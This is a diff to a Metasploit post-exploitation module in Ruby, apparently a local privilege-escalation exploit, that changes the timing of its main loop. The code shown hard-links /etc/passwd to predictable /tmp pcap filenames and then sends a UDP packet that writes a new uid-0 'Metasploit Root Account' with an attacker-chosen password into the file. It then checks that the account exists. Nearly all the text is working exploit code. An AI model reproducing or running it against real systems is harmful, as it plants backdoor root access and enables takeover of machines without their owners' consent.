@@ -70,14 +70,12 @@ class Metasploit3 < Msf::Post
 	def run
 		print_status "Waiting for victim"
 		initial_size = cmd_exec("cat /etc/passwd | wc -l")
-		i = 60
+		i = 0
 		while(true) do
-			if (i == 60)
+			if (i == 0)
 				# 0a2940: cmd_exec is slow, so send 1 command to do all the links
 				cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
-				i = 0
 			end
-			i = i+1
 			if (cmd_exec("cat /etc/passwd | wc -l") != initial_size)
 				# PCAP is flowing
 				pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
@@ -89,7 +87,8 @@ class Metasploit3 < Msf::Post
 				udpsock.sendto(pkt, session.session_host, datastore['RPORT'])
 				break
 			end
-			sleep(1)
+			sleep(1) # wait a second
+			i = (i+1) % 60 # increment second counter
 		end
 
 		if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true") 
